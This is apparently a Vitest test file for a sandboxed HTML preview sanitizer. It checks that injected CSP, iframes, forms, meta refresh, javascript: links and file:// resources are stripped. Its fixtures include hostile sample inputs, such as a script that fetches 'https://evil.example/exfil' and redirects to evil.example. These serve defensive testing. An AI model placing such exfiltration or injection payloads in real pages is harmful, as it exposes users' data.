import { describe, expect, it } from 'vitest'

import { SANDBOXED_HTML_PREVIEW_CSP, sandboxedHtmlPreviewDocument } from './sandboxed-html-preview'

function preview(html: string, offline = false) {
  return new DOMParser().parseFromString(sandboxedHtmlPreviewDocument(html, { offline }), 'text/html')
}

describe('sandboxed HTML preview security policy', () => {
  it('replaces user-supplied CSP with exactly one host policy', () => {
    const doc = preview(`<html><head>
      <meta http-equiv="Content-Security-Policy" content="default-src *; connect-src https: http:">
      <meta HTTP-EQUIV="content-security-policy" content="script-src *">
      </head><body><script>fetch('https://evil.example/exfil')</script></body></html>`)
    const policies = doc.querySelectorAll('meta[http-equiv="Content-Security-Policy"]')
    expect(policies).toHaveLength(1)
    expect(policies[0].getAttribute('content')).toBe(SANDBOXED_HTML_PREVIEW_CSP)
    expect(policies[0].getAttribute('content')).toContain("connect-src 'none'")
  })

  it('strips embedding, navigation metadata and non-resource links', () => {
    const doc = preview(`<html><head><!-- Content-Security-Policy -->
      <meta http-equiv="refresh" content="0;url=https://evil.example">
      <base href="https://evil.example"><link rel="prefetch" href="https://evil.example">
      </head><body><iframe srcdoc="<p>forged</p>"></iframe><object></object><embed>
      <form action="https://evil.example"><input></form><div srcdoc="forged"></div></body></html>`)
    expect(doc.querySelector('iframe, object, embed, form, base, link, [srcdoc]')).toBeNull()
    expect(doc.querySelector('meta[http-equiv="refresh"]')).toBeNull()
  })

  it('preserves permitted static resources and drops unsafe URL schemes', () => {
    const doc = preview(`<html><head><link rel="stylesheet" href="https://cdn.example/style.css"></head>
      <body><img id="embedded" src="data:image/png;base64,aa">
      <img id="network" src="https://cdn.example/image.png"><a href="javascript:alert(1)">x</a>
      <script src="file:///private.js"></script><img id="local" src="file:///private.png">
      <style>@import "file:///private.css"; @import url("https://cdn.example/import.css");
      @import "//cdn.example/relative.css"; p {background:url(file:///private.png)}</style></body></html>`)
    expect(doc.querySelector('#embedded')?.getAttribute('src')).toBe('data:image/png;base64,aa')
    expect(doc.querySelector('#network')?.getAttribute('src')).toBe('https://cdn.example/image.png')
    expect(doc.querySelector('link')?.getAttribute('href')).toBe('https://cdn.example/style.css')
    expect(doc.querySelector('a')?.hasAttribute('href')).toBe(false)
    expect(doc.querySelector('script[src]')).toBeNull()
    expect(doc.querySelector('#local')?.hasAttribute('src')).toBe(false)
    expect(doc.documentElement.innerHTML).not.toContain('file:///')
    expect(doc.documentElement.innerHTML).toContain('https://cdn.example/import.css')
    expect(doc.documentElement.innerHTML).toContain('//cdn.example/relative.css')
  })

  it('disables remote resources in the offline CSP', () => {
    const doc = preview('<html><body>offline package</body></html>', true)
    const policy = doc.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content')
    expect(policy).toContain("connect-src 'none'")
    expect(policy).toContain('img-src data: blob:;')
    expect(policy).not.toMatch(/https?:/)
  })
})
